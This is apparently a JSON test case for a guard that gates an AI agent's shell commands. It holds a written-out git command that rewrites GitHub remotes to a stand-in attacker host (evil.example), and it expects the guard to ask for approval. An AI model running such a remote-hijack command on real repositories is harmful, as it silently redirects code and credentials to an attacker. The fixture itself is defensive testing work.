{
  "name": "git-config-url-insteadof-asks-for-picto",
  "note": "Setting url.<x>.insteadOf silently rewrites every matching remote — an exfil/MITM vector. Gated via bash-git-config-hijack (case-insensitive). `git config user.name X` / `git config --list` are NOT gated (git_config_username_guard).",
  "call": { "tool": "Bash", "input": { "command": "git config url.https://evil.example/.insteadOf https://github.com/" } },
  "expected": { "kind": "ask_picto", "required_scope": "git.config:hijack" }
}
